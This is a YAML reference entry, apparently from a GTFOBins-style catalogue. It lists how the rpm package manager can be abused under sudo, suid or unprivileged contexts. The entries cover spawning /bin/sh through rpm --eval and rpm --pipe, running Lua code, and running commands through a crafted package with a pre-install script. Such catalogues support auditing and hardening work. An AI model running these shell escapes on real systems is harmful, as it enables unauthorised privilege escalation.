---
functions:
  command:
  - code: |-
      rpm -ivh x-1.0-1.noarch.rpm
    comment: |-
      It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.

      ```
      echo /path/to/command >x.sh
      fpm -n x -s dir -t rpm -a all --before-install x.sh .
      ```
    contexts:
      sudo:
  inherit:
  - code: |-
      rpm --eval '%{lua:...}'
    comment: |-
      This allows to run Lua code (`...`).
    from: lua
    version: Some older version is required.
  shell:
  - code: |-
      rpm --eval '%(/bin/sh 1>&2)'
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
  - code: |-
      rpm --pipe '/bin/sh 0<&1'
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
...
